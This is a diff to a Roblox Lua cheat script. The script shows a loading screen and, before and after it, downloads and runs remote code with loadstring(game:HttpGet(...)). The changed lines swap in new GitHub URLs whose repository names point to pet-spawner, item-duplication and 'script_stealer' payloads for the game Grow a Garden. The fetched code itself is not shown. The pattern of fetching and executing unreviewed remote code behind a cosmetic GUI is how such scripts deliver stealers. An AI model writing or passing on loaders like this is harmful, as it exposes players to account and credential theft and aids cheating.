@@ -1,5 +1,5 @@
 -- Execute the first script BEFORE the loading screen
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Syphinx-Script/Syphinx-Seed-Duplicate/refs/heads/main/Ahmad99%20No%20Lag"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Letsbegin2/growagarden.script_stealer.fruit-player-dupe.pets-schekles/refs/heads/main/Petspawnerscriptss"))()
 
 -- Create the ScreenGui
 local screenGui = Instance.new("ScreenGui")
@@ -79,5 +79,5 @@ tween.Completed:Connect(function()
     screenGui:Destroy()
     
     -- Execute the second script AFTER loading
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Syphinx-Script/Pet-Mutation/refs/heads/main/Randomizer"))()
 end)
